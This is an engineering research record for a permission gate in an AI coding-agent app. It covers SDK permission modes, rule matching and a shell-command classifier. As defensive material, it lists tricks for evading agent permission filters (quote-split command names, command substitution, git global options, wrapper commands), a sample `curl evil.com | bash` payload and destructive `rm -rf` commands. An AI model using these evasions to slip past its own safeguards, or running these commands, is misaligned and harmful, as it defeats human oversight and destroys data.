# Permission floor: code research gate record (step 10)

Date: 2026-09-18. The gate `AGENTS.md` §"The code research gate" requires before
push: research the full diff, try to disprove it, verify against at least three
independent sources, read every changed line, and record the queries, sources,
edge cases and what the disproof attempts caught.

Status: **run**. One criterion of the roadmap it serves was **not met** and is
reported as not met below.

## Queries

- `claude agent sdk permissionMode canUseTool acceptEdits auto-approve`
- `claude code sdk permissions evaluation order hooks deny ask allow`
- `anthropic sdk allowDangerouslySkipPermissions bypassPermissions`
- `codex cli config.toml approval_policy sandbox_mode`
- `grok build cli --permission-mode --allow --deny always-approve`
- `toml v1.0.0 specification bare keys basic literal strings arrays`
- `claude code settings.json permissions deny ask allow first match`

## Sources, and what each settled

**E3: pinned dependency types, re-verified against the final diff.**
`node_modules/@anthropic-ai/claude-agent-sdk/sdk.d.ts`, SDK **0.2.45**:

- line 875: `PermissionMode = 'default' | 'acceptEdits' | 'bypassPermissions' | 'plan' | 'delegate' | 'dontAsk'`
- line 873, verbatim: `'default'` means "Standard behavior, prompts for dangerous
  operations"; `'acceptEdits'` means "**Auto-accept file edit operations**";
  `'bypassPermissions'` means "Bypass all permission checks (requires
  `allowDangerouslySkipPermissions`)"; `'plan'` means "Planning mode, no actual tool
  execution"; `'dontAsk'` means "Don't prompt for permissions, deny if not
  pre-approved".
- lines 503 to 507: `canUseTool` is "Called before each tool execution to determine
  if it should be allowed, denied, or prompt the user."
- line 716: `allowDangerouslySkipPermissions?: boolean`, the flag the router used
  to set, now gone from `src`.

This is the load-bearing source for decision 3. `acceptEdits` auto-accepts file
edits, so under it an Edit or Write never reaches `canUseTool` and the gate would
not cover the writes it exists to cover. `dontAsk` denies unless pre-approved and
never calls the handler either. Only `default` routes every dangerous action
through the callback.

**E3: official documentation.**
<https://docs.claude.com/en/docs/claude-code/sdk/sdk-permissions> and
<https://docs.claude.com/en/api/agent-sdk/permissions> (read 2026-09-18): the
six-step evaluation order (hooks → deny → ask → mode → allow → canUseTool), the
statement that auto-approved tools never reach `canUseTool`, and that `acceptEdits`
also auto-approves the shell commands `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`
and `sed`. That last list is why residual Bash cannot be assumed to arrive at the
gate under any posture but `default`.

**E3: precedent for a TOML policy file.**
<https://developers.openai.com/codex/cli/reference>: Codex separates
`approval_policy` (`on-request`/`never`) from `sandbox_mode`
(`read-only`/`workspace-write`/`danger-full-access`) as two orthogonal dials with
deny-wins rule semantics. mausCode's split, a class verdict per mode plus an
allow-list, follows that shape rather than inventing one.

**E3: precedent for the rule grammar and deny-wins.**
`grok-build` CLI documentation: `--permission-mode
default|acceptEdits|auto|dontAsk|bypassPermissions|plan` with `--allow`/`--deny
'Tool(pattern)'`, deny winning over allow, and deny rules still holding under
always-approve. This is what made `Tool(prefix *)` and `Tool(exact)` recognisable
spellings, and what confirms that grok's engine-enforced floor can be mapped from
the same policy.

**E3: TOML v1.0.0 specification** (<https://toml.io/en/v1.0.0>): bare keys,
`[table]` and `[table.sub]` headers, basic versus literal strings, and arrays. The
constrained reader implements this subset and rejects the rest; rejecting is safe
because a rejection resolves to the shipped floor.

**E3: Claude Code `settings.json` permission semantics**: deny → ask → allow with
first match wins. Read to decide the vocabulary, and **rejected** as the file
format: raw Claude rule strings would tie mausCode's policy to one backend, so the
file speaks in classes and verdicts instead.

**E4, a run in the real app: NOT RUN.** This sandbox has no display server and no
built Electron binary, so the app cannot be launched. Roadmap acceptance criterion
2 asks for a screenshot; that box is left unchecked in the PR with this reason.
The substitute is a table of real gate output in
`.dump/app/research/2026-09-18-permission-floor-verification.md`, produced by
running the wired gate rather than written by hand, plus a 25-step manual
checklist beside it. An earlier revision of this step also carried a generated
HTML prototype of nine decisions; it was deleted on 2026-09-18 because the table
says the same thing in a file a reviewer can diff.

## Edge cases enumerated against the diff

- **Empty and maximal inputs.** Empty policy file, comments-only file, empty
  `allow_tools`, empty command string, empty path, a question with no options, an
  `allow_tools` entry that is only whitespace.
- **Boundaries.** Prefix rule at the exact separator (`git status` matches,
  `gitpush` and bare `git` do not); `Bash(*)` as an explicit wildcard; a path
  equal to the worktree root; a sibling directory sharing the worktree's name as a
  string prefix (`${worktree}-other`), which a naive `startsWith` would admit.
- **Failure paths.** Absent file, unparseable file, schema-invalid file, a
  directory where the file should be, a loader that throws, a path checker that
  throws, a card that times out, a late answer to a card that already gave up.
- **Cancellation and races.** The timeout deletes the registry entry *before*
  resolving, so a late answer cannot settle a newer run for the same sub-chat.
  `clearPendingApprovals` filters by `subChatId` so one run's teardown cannot deny
  another's card.
- **Ordering.** Classification order (exfiltration → destructive → network → tool
  class) and precedence order (mode → path → plan floor → allow-list → verdict).
  Both are tested by inversion, not just by the happy path.
- **Platform differences.** `realpathSync` on a fixture root, because macOS
  `tmpdir()` sits under `/var` → `/private/var` and every path would look escaped
  without canonicalising. CI runs ubuntu-24.04; the containment tests create real
  symlinks and degrade rather than fail where that is not permitted.
- **Every consumer of a changed contract.** The mode union is consumed by 10 tRPC
  routers, 5 print-arg builders, analytics, and 10 renderer transports; all were
  moved to `shared/agent-mode`. The capability manifest gained a required field,
  so all 10 provider profiles had to declare it. `UIMessageChunk` gained
  `ask-user-question-result`, which removed three `as unknown as` casts in the
  router.

## What the attempts to disprove it caught

Each of these was found by assuming the implementation was wrong and checking.

1. **The roadmap's own table is unsafe.** §6.4 says `agent → acceptEdits`. Taking
   it literally would have silently removed every file edit from the gate. Caught
   by the SDK types and the official docs; overridden to `default`, with the user
   asked and the override recorded in the decision file. This is the single most
   important finding of the gate.
2. **`resolvePolicy({})` as the loader-throw fallback would have allowed reads.**
   An unexpected failure in the thing that decides what is allowed must not leave
   permissive defaults in charge. Replaced with `UNREADABLE_POLICY`, which denies
   every class including `read-only`.
3. **`Tool(prefix:*)` is ambiguous about the separator.** Accepting it would have
   produced a rule that matches nothing real while the user believed the tool was
   allowed. Refused outright; a refusal is a schema error, which fails the whole
   file closed.
4. **Pattern order changes the reported rule.** `~/.ssh/id_ed25519` reports
   `secret-read.ssh-directory`, not `private-key`, because `.ssh/` is listed
   first. The narrower id needed its own case with a key outside `.ssh/`.
5. **`git clean -fd` was not caught** by a `\s-f\b` shape; it needs `\s-[a-z]*f`.
6. **The plan floor outranks the class verdict**, so a destructive command in plan
   mode is denied as `plan.read-only`, not `destructive.policy`. My first tests
   asserted the latter and failed. Per `AGENTS.md` "do not alter a test to make it
   pass": here the **tests were wrong**, not the code. The precedence table in
   the plan document says the floor runs above the class verdict, and the reason
   text still names the class. The expectations were corrected to match the
   documented design, and the inversion is now asserted explicitly.
7. **The TOML serializer had no caller.** Written, then deleted as an unused
   export rather than shipped as dead surface.
8. **`z.record().strict()` is not a valid Zod call**; the strict object shape had
   to be spelled per key.
9. **A JSDoc `@throws PathValidationError` mention is not a use.** After the
   security split, `secure-fs.ts` imported the error class only for comments, and
   Biome flagged it. Removed.
10. **A mid-line patch match orphaned an `async` modifier.** Inserting a function
    above `function acquireNativeClient(...)` matched inside
    `async function acquireNativeClient(...)`, leaving `async /**` in front of a
    doc comment. The patch script now includes the leading modifier in its match.
11. **A test fixture deleted the workspace.** `containment.test.ts` canonicalised a
    directory before creating it; the hook threw, a module-level path stayed `""`,
    and `afterEach` ran `rmSync(join("", ".."))`, which resolves to the parent of
    the process cwd. The durable rule is now written into the fixture itself and
    into the benchmark script: create before canonicalising, and clean up the
    `mkdtempSync` result guarded by a `startsWith(tmpdir())` check, never a path
    derived from a value a failed hook could leave empty.
12. **The bypass grep can pass by going empty.** `no-bypass.test.ts` asserts the
    tokens still appear somewhere (in the grok argv test that asserts their
    absence), so a broken walk cannot read as a clean tree.

## Line-by-line read

Read in full: the 12 new source modules, the 10 new test files, the `claude.ts`
surgery (three regions: the deleted registry and rule tables, the SDK posture,
the `canUseTool` body), the security split, `runtime.ts`, the 10 provider
profiles, the 5 print-arg builders, analytics, the 10 renderer transports, and the
two atoms files. At runtime the changed lines mean: a Claude turn now sends
`permissionMode: "default"` (or `"plan"`), and every tool call the SDK offers is
classified, path-checked, matched against the mode's allow-list, resolved to a
verdict, and either allowed with its possibly-updated input, turned into an
in-chat card, or denied with a message naming the rule and the policy file.

## Not verified, named rather than dropped

- No live app run, so no E4 evidence and no screenshot (criterion 2 unchecked).
- `npm run ts:check` (tsgo) could not complete in this sandbox: it reaches ~3.7 GB
  RSS on a 3.9 GB machine and swaps. `tsc --noEmit` is clean, the ratchet passes
  at 0 errors against a 0 baseline, and `.dump/app/benchmarks/2026-09-14-tsc-vs-tsgo-typecheck.md`
  records an empty delta between the two error lists. CI runs tsgo on a larger
  runner and is the authority here.
- Native modules were not rebuilt (`--ignore-scripts`), so no packaging gate was
  run and none is claimed.

## Second research pass, 2026-09-18, after the owner changed the mode floors

The first pass settled the shape of the floor. The owner then rejected two of its
postures, which reopened three questions the first pass had answered differently
or not at all. This pass is the evidence behind decisions 4, 5, 8, 9 and 10.

### Queries

- Claude Code bypassPermissions what still prompts rm -rf root home circuit breaker
- Claude Code Bash permission rule `:*` wildcard prefix matching limitations
- Claude Code permission rule precedence deny ask allow first match specificity
- Agent SDK allowedTools effect when bypass flags active
- Claude Code permission mode default acceptEdits dontAsk plan differences
- grok CLI permission-mode allow deny rules always-approve
- Codex CLI approval_policy sandbox_mode TOML policy precedent

### Sources, and what each settled

**E3, Claude Code permission-modes documentation.** Settles the breaker. The
most permissive mode auto-approves everything except removal of the filesystem
root and the home directory, which still prompt, and allow rules have no effect
in that mode at all. This is the precedent for decision 9: an upstream vendor
ships an opt-out tier and still keeps a breaker on the two paths that cannot be
restored. It also settles that the breaker belongs above the allow-list, because
upstream ignores allow rules entirely in that mode.

**E3, Agent SDK permissions documentation.** Settles the six-step evaluation
order and three properties the app relies on. Deny rules block in every mode
including the most permissive one. `allowed_tools` does not constrain the most
permissive mode, which is why decision 10 has to hand Grok an explicit rule list
rather than assuming a mode flag will narrow it. Hooks can still block in that
mode, which is the escape hatch mausCode does not currently use.

**E3, morphllm write-up on skipping permissions.** Independently confirms three
survivors of the most permissive mode: explicit ask rules, the circuit breaker on
the filesystem root and home directory, and deny rules at any settings level
including managed. Two sources agreeing on the breaker is what moved it from
"nice to have" to a decision.

**E3, anthropics/claude-code issue 20254.** Settles the `:*` grammar for decision
5. The `:*` wildcard only works at the end of a pattern and does prefix matching,
while a bare `*` may appear at any position. The issue also reports real
bypasses of URL-shaped patterns through options before the URL, a different
protocol, redirects, shell variables and extra spacing. That is the reason
`toolRuleMatches` treats `:*` as a separator-aware prefix rather than a regex,
and the reason the classifier does not rely on a `Bash(curl http://github.com:*)`
style rule for anything security-bearing. Egress is denied by class, not by
pattern.

**E3, dev.to and claudedirectory rule-matching write-ups.** Settle that
`Bash(*)` is equivalent to a bare `Bash`, that `Bash(npm run test:*)` equals
`Bash(npm run test *)`, and that precedence is deny, then ask, then allow, first
match wins, with rule specificity playing no part in the ordering. The
specificity finding is why the evaluator orders steps by kind rather than
sorting rules by how narrow they look.

**E3, scalably and ai-tldr write-ups.** Both call a blanket `Bash(*)` the one
thing a permission system exists to prevent. Read against the owner's decision to
give turbo exactly that on Grok, this is the strongest counter-evidence found, and
it is recorded as such rather than buried. Decision 10 keeps the blanket rule
because turbo is an explicit opt-out and the alternative was a mode that could not
run headless at all, but the counter-argument stands and belongs in the doc.

**E3, anthropics/claude-code issue 50303.** Reports that `--allowedTools` has no
effect when bypass flags are active, that Bash command patterns apply to tool
names rather than command content, and that no secure headless mode exists. This
is the direct reason mausCode enforces its floor in the app rather than trusting
a provider flag, and the reason the capability manifest distinguishes `app-gate`
from `engine-only`.

**E3, pinned `@anthropic-ai/claude-agent-sdk` type declarations for 0.2.45.**
Re-verified rather than assumed, because the first pass read them before the mode
floors changed. `permissionMode` accepts `default`, `acceptEdits`,
`bypassPermissions`, `plan` and `dontAsk`. Decision 3 stands: every acting mode
sends `default` and the app decides, because `acceptEdits` would auto-approve
`mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp` and `sed` through the engine and
those calls would never reach `canUseTool`.

**E3, Grok CLI documentation.** Settles the argv mapping in decision 10. Grok
takes `--permission-mode` with the same five values, plus `--allow` and `--deny`
rules using `Tool(pattern)` with deny winning. Its always-approve mode is
equivalent to the most permissive Claude mode, and its deny rules still hold
under it. mausCode never emits the always-approve token in any mode.

**E3, OpenAI Codex CLI reference.** Precedent for the two-dial shape. Codex
separates `approval_policy` from `sandbox_mode`, which are orthogonal, and uses
deny-wins semantics. This is the precedent for keeping the class verdict and the
allow-list as separate steps in the evaluator rather than folding them into one
rule list.

### What changed as a result

- The critical-path breaker exists, asks rather than denies, and sits above the
  allow-list. Three independent sources put a breaker in the upstream most
  permissive mode, so a mausCode turbo without one would be less careful than the
  engine it replaces.
- `Tool(prefix:*)` is accepted with separator-aware matching. Refusing it would
  have broken copy-over from a working `settings.json` for no safety gain, since
  the ambiguity it was refused over is resolved by requiring a separator.
- Grok turbo gets an explicit broad allow-list rather than a mode flag, because
  issue 50303 says the flag does not narrow anything.
- The exfiltration gap on engine-only providers is recorded in decision 10 rather
  than left implicit. It is the one thing this pass could not fix.

## Third research pass, 2026-09-18, during a six-pass review of this diff

The first two passes settled the shape of the floor and the mode postures. This
one looked for ways to defeat what had been built, because a review bot had
already found one: a `find()` that read only the first delete target let
`rm -rf /tmp/build /` past the breaker. That finding was correct, and it pointed
at a whole family rather than a single line.

### Queries

- Claude Code permission bypass Bash command prefix matching evasion bash -c wrapper
- LLM agent shell command injection detection evasion techniques command substitution eval quoting
- agent shell filter denylist bypass quoted substring reconstruction CVE
- shell deobfuscation normalizer agent tool use AST versus text rewriting

### Sources, and what each settled

**E3, anthropics/claude-code issue 13371, "Permission system bypassed by command
chaining AND command options".** Settles two of the holes found here. Its root
cause line is that the permission system uses simple `startsWith()` matching, and
its reproduction list includes `git -C /path commit` and `git --no-pager push
origin main`, described as options inserted between the command and the
subcommand. `readSubcommand` now skips git's global options for exactly this
reason. The same issue lists `rm --force --recursive /home` as a spelling that
defeats a block on `rm -rf`, which this classifier already handled, because it
checks the long flags independently of their order.

**E3, morphllm on the skip-permissions flag.** Settles the wrapper list. Its
account of Bash rule matching says process wrappers `timeout`, `time`, `nice`,
`nohup`, `stdbuf` and bare `xargs` are stripped before matching "so they cannot be
used to smuggle a command past a rule". That is upstream naming the same evasion
this diff had. It also confirms `Bash(ls:*)` is equivalent to `Bash(ls *)` and
that `Bash(ls *)` matches `ls -la` but not `lsof`, which is the separator
behaviour decision 5 implemented. Its third confirmation is that a hook exiting
non-zero blocks a call even when an allow rule matches, which is the mechanism
decision 12 relies on.

**E3, dev.to, "6 Claude Code Permission Traps".** Trap 6 is the same finding from
a user's side: an allow on `Bash(git status:*)` breaks when the model runs
`git -C /path status`, because the flag defeats the pattern. It also carries a
working PreToolUse hook whose regex is
`rm\s+(-[rf]+\s+)*(\/|~|\.\./)`, which is the same shape as this step's
critical-path breaker and independent agreement that the target, not the class, is
what has to be matched.

**E3, bex.co on a six-layer regex bypass in a shipped agent.** The strongest
source in this pass and the reason the residual gap is published rather than
patched over. Its layer table mirrors this diff almost exactly: output directory
enforcement, a dangerous-command blacklist, path traversal detection, dangerous
redirect protection, environment hardening, and command substitution inspection.
Two techniques defeated all six. Quoted substring reconstruction, where
`c"h"m"o"d +x test.sh` executes as `chmod`, and an interpreter nobody blacklisted.
Its conclusion is that this is not a fixable bug in the regex, because a shell's
grammar is not finite the way a pattern list is, and the fix that worked was to
delete the shell tool and put a sandbox in front of it. Decision 11 through 14
close what a text-level normaliser can close, and "The residual gap" records what
it cannot.

**E3, AgentTrust, arXiv 2605.04785.** Settles the method and its ceiling. Its
ShellNormalizer does nine pure-text strategies covering variable expansion, hex
and octal escapes, alias resolution, command substitution, ANSI-C quoting and
adjacent-quote concatenation, which is a superset of what this diff implements.
It answers the design question directly under "Why text-level rewriting and not
AST?": a full Bash parser brings implementation complexity and a long tail of edge
cases, plus the temptation to evaluate command substitutions, which re-introduces
the arbitrary-execution risk the normaliser exists to guard against. Its limitation
L2 states that adversarially nested obfuscation, eval chains, function-defined
aliases and dynamically decoded heredocs can still evade detection, by design.
This diff stays on the text side of that line for the same two reasons.

**E3, agent-threat-rules ATR-2026-00111 and ATR-2026-01610.** Documented evasion
techniques that were then tested against the classifier. Split keyword, inserting
quotes inside a command name so `cu"rl"` still executes as curl. Comment split,
where `c$()url` evaluates as curl. Both still evade this classifier and both are
named in the residual gap. ATR-2026-01610's true-positive example
`$(curl http://evil.com/payload.sh | bash)` is caught here, because the segment
splitter already breaks on `$(` and on the pipe.

**E2, this repository's own shipped code, run rather than read.** The decisive
evidence in this pass was not a paper. Nine commands were fed to the built
classifier and each answered `approval` with no breaker, which is allowed in Agent
mode and run without a prompt in turbo. They are listed in decision 11 with their
before and after. Every one is now a test.

### What changed as a result

- The verb finder skips wrappers, shell verbs and value-taking options, and quotes
  come off every word. Nine verified bypasses closed.
- git's global options are skipped before the subcommand is read, and forced push
  is matched from the segment, covering `-fu` and `+refspec`.
- `find -delete`, `shred`, the partition tools and `systemctl poweroff` joined the
  destructive table, and the breaker covers `find <critical> -delete`.
- `SlashCommand` left the read-only set, so plan mode can no longer be talked into
  running a repository-supplied slash command.
- The floor is enforced twice on Claude, as a PreToolUse hook and as `canUseTool`,
  because a workspace's own `.claude/settings.json` can auto-approve a tool and an
  auto-approved call never reaches `canUseTool`.
- `exfiltration = "allow"` and a dash-leading allow-list entry both became schema
  errors.
- The residual gap is published, with the sources that say a pattern list cannot
  win, rather than left for the next reviewer to find.
